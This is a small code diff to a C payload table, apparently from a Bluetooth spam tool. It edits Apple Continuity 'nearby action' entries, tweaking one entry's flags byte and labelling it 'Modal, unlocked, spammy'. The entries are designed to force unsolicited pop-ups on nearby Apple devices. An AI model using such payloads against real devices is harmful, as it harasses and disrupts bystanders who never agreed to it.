@@ -86,12 +86,12 @@ static Payload payloads[] = {
              .data = {.nearby_action = {.flags = 0xC0, .type = 0x27}},
          }},
     {.title = "Join This AppleTV?",
-     .text = "Modal, unlocked",
+     .text = "Modal, unlocked, spammy",
      .random = false,
      .msg =
          {
              .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.flags = 0xC0, .type = 0x20}},
+             .data = {.nearby_action = {.flags = 0xBF, .type = 0x20}},
          }},
     {.title = "AppleTV Audio Sync",
      .text = "Banner, locked, long range",
